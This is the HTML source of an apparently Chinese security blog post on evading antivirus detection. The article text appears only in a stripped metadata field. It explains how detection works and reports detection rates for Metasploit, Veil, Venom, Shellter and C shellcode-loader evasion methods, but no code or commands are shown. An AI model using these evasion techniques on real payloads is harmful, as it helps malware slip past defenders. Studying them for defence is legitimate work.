<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>内网渗透-免杀 | Small Hao Blog</title><meta name="keywords" content="攻防知识"><meta name="author" content="SmallHao"><meta name="copyright" content="SmallHao"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="内网渗透-免杀"><meta name="application-name" content="内网渗透-免杀"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="内网渗透-免杀"><meta property="og:url" content="http://example.com/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/index.html"><meta property="og:site_name" content="Small Hao Blog"><meta property="og:description" content="内网渗透-免杀杀软原理可执行文件存在的两种状态及检测方式：  未执行时在硬盘上的状态（静态检测） 执行后加载进内存的状态（动态监测）  杀软的基本等级：  无害：无任何可疑行为，无任何特征命中病毒特征 可疑：存在可疑行为，例如操作注册表、打开Powershell、修改用户、操作敏感文件等 有害：特征"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://img1.baidu.com/it/u=877727430,37580436&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=667"><meta property="article:author" content="SmallHao"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://img1.baidu.com/it/u=877727430,37580436&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=667"><meta name="description" content="内网渗透-免杀杀软原理可执行文件存在的两种状态及检测方式：  未执行时在硬盘上的状态（静态检测） 执行后加载进内存的状态（动态监测）  杀软的基本等级：  无害：无任何可疑行为，无任何特征命中病毒特征 可疑：存在可疑行为，例如操作注册表、打开Powershell、修改用户、操作敏感文件等 有害：特征"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  music_page_default: "nav_music",
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: SmallHao","link":"链接: ","source":"来源: Small Hao Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Small Hao Blog',
  title: '内网渗透-免杀',
  postAI: '',
  pageFillDescription: '内网渗透-免杀, 杀软原理, 静态检测, 动态检测, 流量检测, 云查杀, 免杀原理, 静态免杀, 修改特征码, 花指令免杀, 加壳免杀, 动态免杀, API免杀, 内存免杀, 二次编译, 分离免杀, 资源修改, 免杀技术研究, Bypass一览表（2020年）, Bypass一览表（2022年）, 复现环境（2022年）, Metasploit自带免杀, 原生态payload(VT查杀率51x2F69), msf自编码免杀(VT查杀率48x2F67), msf自捆绑免杀(VT查杀率15x2F69), msf自捆绑+编码(VT查杀率16x2F69), msfvenom多重编码(VT查杀率28x2F67), Metasploit Evasion免杀, 生成exe(VT查杀率43x2F69), 生成hta(VT查杀率14x2F59), 生成install_util(VT查杀率33x2F69), Veil免杀, 安装Veil, 使用veil直接生成exe(VT查杀率44x2F69), 使用veil+mingw-w64(VT查杀率11x2F69), Venom免杀, 安装Venom, venom生成exe(VT查杀率35x2F68), venom生成dll(VT查杀率11x2F70), Shellter免杀, 安装Shellter, 生成payload（VT免杀率7x2F69), C、C++加载shellcode, 方法1 msf直接生成exe（VT免杀率51x2F69）, 方法2 申请动态内存加载（VT免杀率36x2F69）, 方法3 嵌入汇编加载（VT免杀率36x2F69）, 方法4 强制类型转换（VT免杀率34x2F68）, 方法5 汇编花指令(VT免杀率37x2F69), 方法6 xor加密（VT免杀率21x2F69）, 方法7 base64加密1（VT免杀率21x2F68）, 方法8 base64加密2（VT免杀率17x2F67）, 总结, 参考链接内网渗透免杀杀软原理可执行文件存在的两种状态及检测方式未执行时在硬盘上的状态静态检测执行后加载进内存的状态动态监测杀软的基本等级无害无任何可疑行为无任何特征命中病毒特征可疑存在可疑行为例如操作注册表打开修改用户操作敏感文件等有害特征命中病毒特征静态检测静态检测是在不实际运行程序的情况下进行的分析大部分的静态检测对象是针对特定版本的源代码也有些静态程序分析的对象是目标代码静态检测针对样本文件在硬盘上的状态进行检测样本检测此类检测会对文件整体以及各个节段进行计算而后对比是否存在于特征病毒库中这是最早期的检测方法对于检测在源码中修改一下变量名或在编译完成之后通过二进制查看器修改某一不重要的字节码即可改变整个文件的特征码检测由于样本检测的缺点特征码会提取文件中部分关键字节码作为特征进行检测字节码可以是硬编码的域名互斥体名称加密秘钥或部分关键流程代码杀软会扫描存在磁盘上的镜像文件如果满足特征码就识别为恶意软件黑白名单检测对于一些系统进程或是杀软进程可能会默认加白这样即便有些恶意行为也不会被查杀通常静态检测会识别代码中存在的函数函数尤其是与内存堆线程相关的函数例如等编程语言关键词等关键词例如中的常见的绕过思路绕过静态检测的方式通常有多次加密内存加载执行加壳改壳添加替换资源加密等常用的静态检测平台注意是国外平台请谨慎操作最好不要直接上传文件建议仅校验并检查是否为恶意文件动态检测动态检测针对样本文件内存中的状态进行检测内存特征码检测对于静态文件特征码来说可以将做多次加密完全抹掉其原本特征降低杀软的报毒率但是当进入内存需要执行代码时需要完全解密这时候杀软只需要遍历内存根据特征码进行查杀即可敏感检测在关键的入口或道路进行监控如果单次或多次触发警告比如读取并修改了其他进程的内存或在其他进程中开了个远程线程将触发告警对于不同杀软的不同策略将根据调用顺序调用源参数判断是否是正常调用敏感行为检测实现一个功能不一定非要用某一个固定的接口因此实现一个读写内存操作单检测一个是无效的此时只要对象触发了某种行为在其他进程中开了线程那么就判定为恶意行为常见的病毒恶意行为注册表操作添加启动项添加服务文件操作写入文件读取系统文件删除文件移动文件进程操作杀死进程创建进程用户操作添加用户删除用户删除用户其他操作注入劫持等常见的绕过思路绕过动态检测的方式通常是白名单调用敏感行为再导入恶意内容常用的动态检测平台流量检测流量检测针对恶意程序在网络通讯流量层面上的状态进行检测结构特征此类特征一般是指已知远控的恶意程序心跳包比如心跳包特征会按照攻击者设置的频率发送固定结构固定内容的数据包以证明存活内容特征此类特征一般是指各类漏洞的流量包特征冰蝎哥斯拉等流量特征对于此类流量可以编写流量规则进行过滤检测比如规则规则等域名证书匹配对于数据包中的域名等信息链接威胁情报平台查询是否存在恶意行为比如扫描用作回连或网站挂马等对于此类流量可以选择弹窗告警或直接阻断常见的绕过思路绕过流量检测的方式通常有分段传输内容加密使用合法证书等云查杀云查杀的不同点在于它的病毒库是放在服务器端的而不是本地客户端只要联网病毒库就会同步更新病毒库更加强大当开着杀软的云查杀的时候有时候刚开始没报病毒但过一会就提示病毒了免杀原理静态免杀修改特征码特征码是能够识别一个程序的不大于字节的字符修改特征码是在不改变程序运行效果的前提下更改其特征码修改特征码最重要的是定位特征码但是定位了特征码修改后并不代表程序就能正常运行费时费力由于各个杀软厂商的特征库不同所以一般也只能对一类的杀软起效果虽然效果不好但有时候在没有源码的情况下可以一用花指令免杀花指令其实就是一段毫无意义的指令也可以称之为垃圾指令花指令是否存在对程序的执行结果没有影响所以它存在的唯一目的就是阻止反汇编程序或对反汇编设置障碍为一个程序添加一段花指令之后程序的部分偏移会受到影响如果反病毒软件不能识别这段花指令那么它检测特征码的偏移量会整体位移一段位置也就无法正常检测木马了加壳免杀软件加壳其实也可以称为软件加密或软件压缩只是加密或压缩的方式与目的不一样壳就是软件所增加的保护并不会破坏里面的程序结构当我们运行这个加壳的程序时系统首先会运行程序里的壳然后由壳将加密的程序逐步还原到内存中最后运行程序加壳能够掩盖特征码特别是对于不开源的文件加壳可以绕过很多特征码识别但是壳也有自己的特征主流的壳例如等被检测出将直接报毒可以用一些冷门的加密壳或基于开源压缩壳做二次开发加壳工具动态免杀免杀替换杀软不可能拦截所有可以使用相同功能的进行替换例如替换重写逆向后完全重写系统功能实现对应功能的底层寻找更底层的进行调用绕过拦截例如函数或者通过函数调用驱动功能来完成功能模拟系统调用内存免杀在执行外壳代码时要先将原软件解密并放到内存里然后再通知执行加壳时需要加一个混淆程序原有代码的壳才能躲过杀软查杀二次编译的提供了多种格式的和生成的也为二次加工提供了很大便利是中唯一的评价是的编码器这种多态编码技术使得每次生成的攻击载荷文件是不一样的编码和解码也都是不一样的还可以利用管道进行多重编码进行免杀目前的特征基本都进入了杀软的漏洞库很难实现单一编码而绕过杀软所以对进行进一步修改编译成了免杀的主流有很多借助于等语言对进行二次编码从而达到免杀的效果分离免杀例如分离免杀和分离免杀将和加载器分离实现简单但效果不错资源修改有些杀软会设置有扫描白名单比如之前把程序图标替换为安全卫士图标就能过的查杀添加资源使用将正常软件的资源加入到恶意软件例如图片版本信息对话框等替换资源使用替换无用的资源例如版本等添加签名使用签名伪造工具将正常软件的签名信息添加到恶意软件免杀技术研究一览表年一览表年对应杀软及名称卡巴微软瑞星金山江民趋势序号免杀方法年年火绒卡巴微软瑞星金山江民趋势未免杀处理自编码自捆绑捆绑编码多重编码模块模块模块原生编译生成生成生成生成动态内存嵌入汇编强制转换汇编花指令加密加密加密复现环境年时间攻击机免杀方法此处仅介绍其余方法参见原原各杀软版本杀毒版本火绒版本安全卫士本文各杀软版本火绒版本安全卫士测试平台以下简称查杀率代表静态查杀能力注意如果是自己做免杀建议测试机不要连互联网更不要上传到类似的平台上不要上传不要上传不要上传上传一次以后你自己辛辛苦苦写的免杀可能就不再免杀了自带免杀均使用的模块生成攻击机监听端口原生态查杀率生成原始和火绒都能查杀在上查杀率为原为火绒查杀成功查杀失败自编码免杀查杀率使用可查看所有编码器评级最高的两个为和其中也是免杀中使用频率最高的一个编码器使用生成参数为编码次数使用参数去掉中的空字符由于编码技术是多态的也就是说每次生成的文件都不一样有时生成的文件会被查杀有时却不会当然这个也和编码次数有一定关系编码次数好像超过次就经常生成出错但是编码次数多并不代表免杀能力强和火绒都能查杀在上查杀率为原为火绒查杀成功查杀失败自捆绑免杀查杀率在生成时可以使用捆绑功能使用的参数可以指定一个自定义的可执行文件作为模板并将嵌入其中后面跟对应文件路径就可以这里使用一个正规的作为被捆绑测试软件生成命令如下生成的两个文件对比大小完全一样能否免杀也和被捆绑有一定关系可以选微软的一些工具作为模板程序能查杀火绒不能查杀但是识别时间比前两种方法久一些原火绒也能查杀在上查杀率为原为自捆绑编码查杀率将上面的编码和捆绑两种方法结合一下进行尝试与上一种方法对比大小完全一样可修改编码次数编码次数越多生成的越可能免杀经测试编码次和次可免杀能查杀火绒不能查杀但是识别时间比前两种方法久一些原火绒动态静态均能查杀而不会报毒在上查杀率为原为多重编码查杀率的编码器可以对进行一定程度免杀同时还可以使用多重编码功能通过管道让用不同编码器反复编码进行混淆如下命令使用管道让对攻击载荷多重编码先用编码次接着来次的编码再来次的编码最后才生成以为模板的可执行文件如果报错则添加参数还有更多重编码姿势经过测试发现使用的编码类型越多免杀率可能会降低猜测是因为各种编码引入了更多的特征码同时生成的也很可能无法正常执行这个也和被捆绑程序有一定关联可以查杀火绒不能查杀在上查杀率为原为了免杀年月升级到了引入了一个新的模块叫模块官方宣称这个模块可以创建反杀毒软件的木马有以下几个模块可以使用进行查看模块生成查杀率使用进行生成不打开杀软的情况下可正常上线打开杀软和火绒都能查杀在上查杀率为原为火绒生成查杀率用另外一个模块生成一下同样被杀但是火绒静态行为查杀都没发现问题可正常上线在上查杀率为不过在线查毒时显示也没查出来但本地测试时却是能查出来的所以在线查杀还是不太精准的复现时该模块生成的可执行无法运行生成查杀率还提供了其他几个模块比如创建根据说明需要使用进行编译一下然后用加载文件是微软中的语言编译器本机安装了后就可以找到该文件用里的进行编译生成直接执行无法上线并且查杀报毒根据说明需要使用来加载才能成功上线注意的是如果生成的是位的就要用位的下的来加载否则文件会无法执行和火绒都能查杀原静态查杀都没有问题执行时行为查杀会报毒在上查杀率为原为火绒免杀和是三大老牌免杀工具是一个用写的免杀框架可以将任意脚本或一段转换成可执行文件还能利用框架生成相兼容的工具从而逃避了常见防病毒产品的检测安装推荐方式进行安装镜像地址拉取镜像拉取成功后执行是将宿主机的目录映射到里面这样生成的可以直接在宿主机里使用之后再进入镜像可以在启动镜像后使用下面命令执行命令可启动版本为有两个免杀的工具和可生成在中使用的是用做文件免杀一般选择选择功能查看列表使用可以看到到种推荐使用以和语言的编码方式像这类的与用户有较高的交互就容易被查杀原理可以参考使用直接生成查杀率可以直接生成支持的我们先试一下看看效果使用语言生成的设置好的监听主机和端口设定好生成的的名称例如一系列编码编译之后就生成了因为之前已经做过目录映射所以在宿主机的目录可直接看到生成的文件在中监听在测试主机执行和火绒均可以查杀原在中可上线和火绒均不报毒在上查杀率为原为火绒使用查杀率先用生成选择使用模块选择输入生成文件名为先生成一个可以被利用的然后用来编译的安装可参考若编译报错可以尝试指定库生成可执行文件和火绒均可以查杀原全程开启卫士和杀毒以及火绒编译运行上线都没有问题在上查杀率为原为了火绒免杀利用生成不同的格式的如等然后将生成的注入一个模板例如并使用类似或之类的编译器生成可执行文件的一些功能还会直接调用等来直接创建免杀程序避免重复造轮子安装安装和运行必须是在图形界面下如果是终端连接到进行连接是不行的依赖的软件比较多所以安装出现问题是很正常的从上拖到本地修改文件执行权限安装依赖库和软件运行代码高亮有些问题但是问题不大还是可以用的生成查杀率启动然后选择也就是然后会列出所有可用的个支持的种类还是比较全面的等免杀工具都内置在里面了而且支持很多种类似的格式先生成一个最简单直接的第个模块通过编译程序在输入之后会弹出一个框让你输入地址这个就是你监听主机的地址然后输入端口号之后选择选择最常规的输入一个文件名例如然后在编译和生成的过程中会弹出来两个选项框一般默认就行之后会提示已经生成并询问你如何分发直接在测试机上执行就行了可见文件夹已经生成了和火绒均可以查杀原静态检测没问题但行为检测能查杀出为病毒火绒则静态动态都没有检测到在上查杀率为原为火绒生成查杀率选择之后在中选择第个生成后面的操作和上面那个差不多然后就能看到生成了文件原将文件拷贝到测试机上命令行中执行可动静态免杀过和火绒正常上线在上查杀率为本文复现时出现问题免杀注意目前只能注入位的可执行文件需要管理员权限运行安装系统中安装中不是很好用中手动下载手动下载官方下载站点下载后解压无需安装下可直接使用生成免杀率需要提前准备一个文件作为被注入程序用之前选的来进行测试必须使用位文件下载一个位之后程序会把进行备份因为生成的会自动覆盖原来的但生成报错换了一个位可执行文件选项是否启用隐身模式启用后免杀效果会变差建议不启用还是选择作为全程自动化生成最终的生成文件会替换原来的通过对比可发现程序稍微变大了在中使用进行监听和火绒均可查杀原执行和火绒均可免杀正常上线在上查杀率为了卡巴瑞星原为卡巴瑞星微软三个都没火绒加载以上很多方法都是使用生成然后对进行混淆编码等各种处理最终再使用各种语言进行编译或加载而被用到的最多的语言就是和加载手工编译的方法一般分为两种方式源码直接编译其中对的执行可以使用函数指针执行汇编指令执行申请动态内存等方式且可进行一些加密混淆处理比如免杀工具和都是使用了类似的方法使用加载器加载代码如之类方法直接生成免杀率这是最简单的一种加载的方法直接使用生成语言的为了提高免杀效果使用了编码器在中进行监听然后执行生成的中可正常上线和火绒均可查杀在上查杀率为火绒方法申请动态内存加载免杀率下面的代码会申请一段动态内存然后加载控制台程序不出黑窗口原此处内存报错已修改进行编译关闭杀软中可正常上线打开杀软和火绒均可查杀原火绒静态和动态都可查杀杀毒和卫士没有反应上查杀率为原为受控机没有环境执行时缺少和需要手动安装火绒方法嵌入汇编加载免杀率在中编译执行关闭杀软中可正常上线打开杀软火绒和均可查杀原火绒静态可查杀但是行为检测没报警杀毒和卫士没有反应直接上线上查杀率为原为火绒方法强制类型转换免杀率打开杀软测试和火绒均可查杀但是在上线后几分钟后才检测出来的原静态动态都没问题可正常上线上查杀率为原为方法汇编花指令免杀率打开杀软火绒可查杀不可查杀原火绒静态可查杀但是行为检测没报警杀毒和卫士没有反应直接上线上查杀率为原为方法加密免杀率需要使用一个工具原项目为在此基础上修改了一个版本先用生成一个格式的在文件夹中执行下面命令其中为自己设置的生成了三个文件一个为源码也是下面要用到的一个为源码可以使用进行加载还有一个文件可直接执行也可以编译成执行其中文件中的源码如下稍作修改删除依赖库删除编译执行关闭杀软中可正常上线打开杀软和火绒均可查杀其中结果为具有木马特征程序原火绒静态可查杀但是行为检测没报警杀毒和卫士没有反应直接上线上查杀率为原为方法加密免杀率需要两个文件和文件内容文件内容文件内容原代码报错这里做了一些强制转换和类型修正使用生成编码的把的内容复制到上面文件中编译关闭杀软可成功上线打开杀软火绒可以查杀不能查杀原火绒静态查杀会报毒但行为检测没有反应全通过查杀率为原为方法加密免杀率另外一种加密方式和方法类似实现代码略有不同文件内容年转解码过程字节占位先将要编码的转成对应的值如编码对应值为对应二进制为将其个分组分组而计算机是以存储所以在每组的高位补两个如下对应查找转换表对应解码对应值为对应表的值为对应二进制值为依次去除每组的前两位再拼接成字节即对应的就是转换表共个解码时使用源字符串长度如果不是的倍数那么需要补成的倍数需要补齐的字符个数这样只有的话不需要拼接拼接后的长度实际编码需要的长度的倍数编码后的长度定义指针指向传出的首地址编码长度为调整后的长度字节一组将第一个字符向右移动丢弃对应转换表的字符将对应字符编码后字符赋值给第一字节处理最后一组最后字节的数据编码后的数据要补两个处理正常的字节的数据需要解码的数据不是字节倍数需要解码的数据对应的值对应的值对应的值不在转码表中对应的值是换行或者回车对应的值是将其依次放入一个型中占字节文件内容文件内容原代码报错这里做了一些强制转换和类型修正使用生成编码的把的内容复制到上面文件中编译关闭杀软可成功上线打开杀软火绒可以查杀不能查杀上查杀率为原为总结与年相比年卷了很多纵览和火绒就能直观感受到确实杀软能力越来越强了年可以卡巴斯基等杀软的方法年均失效免杀操作层出不穷特别是近两年也有很多新的优秀项目本文仅为最基本的免杀方式前路漫漫还有很多要学习的共勉一些知识点常见免杀工具种自免杀等常见免杀编程语言等常见免杀白名单程序个等参考链接远控免杀系列文章杀软进程检测脚本',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-03-20 15:17:54',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://img.smallhao.ddns-ip.net/IMG_6062.jpeg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Small Hao Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 列表</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 免责声明</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/%E7%94%A8%E6%88%B7%E5%8D%8F%E8%AE%AE/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 免责声明</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/%E8%BD%AC%E8%BD%BD%E9%A1%BB%E7%9F%A5/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 转载须知</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 留言板</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://img.smallhao.ddns-ip.net/making.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://img.smallhao.ddns-ip.net/making.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://img.smallhao.ddns-ip.net/zhifubao.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://img.smallhao.ddns-ip.net/zhifubao.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">攻防知识<sup>6</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a 